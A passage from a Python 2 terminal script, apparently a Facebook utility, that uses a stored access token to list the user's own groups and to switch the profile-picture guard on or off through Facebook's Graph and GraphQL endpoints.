        jalan('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mPlease wait \x1b[77;1m...')
        print ''
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mName  \x1b[0m:\x1b[77;1m ' + str(nama)
                print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + str(id)
                print ''

            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mTotal Group \x1b[0m %s' % len(listgrup)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved \x1b[77;1m: \x1b[0mgrupid.txt'
            f.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStopped'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGroup not found'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mNo connection network'
            keluar()
        except IOError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError when creating file'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('reset')
    print ''
    print logo
    print ''
    print '\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mEnable'
    print '\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mDisable'
    print '\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack'
    print ''
    g = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mSlect Option: ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[94;1m\xe2\x9c\x93\x1b[0m] \x1b[77;1mActivated'
        raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            os.system('reset')
            print ''
            print logo
            print ''
            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[77;1mDeactivated'
            raw_input('\n\x1b[0m[ \x1b[93;1mBack \x1b[0m]')
            lain()
        else:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mError'
            keluar()


if __name__ == '__main__':
	login()
